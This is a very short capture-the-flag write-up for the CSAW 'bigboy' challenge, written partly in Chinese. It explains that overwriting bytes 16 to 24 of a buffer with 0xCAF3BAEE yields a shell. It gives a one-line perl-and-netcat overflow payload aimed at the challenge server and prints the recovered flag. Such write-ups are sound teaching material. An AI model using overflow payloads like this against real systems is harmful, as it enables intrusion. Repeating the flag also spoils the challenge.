# bigboy

把16到24 bytes蓋成`0xCAF3BAEE`就能直接get shell

payload:

`(perl -e 'print "a"x16,"\x00\x00\x00\x00\xee\xba\xf3\xca"';cat) | nc pwn.chal.csaw.io 9000`

flag:

`flag{Y0u_Arrre_th3_Bi66Est_of_boiiiiis}`
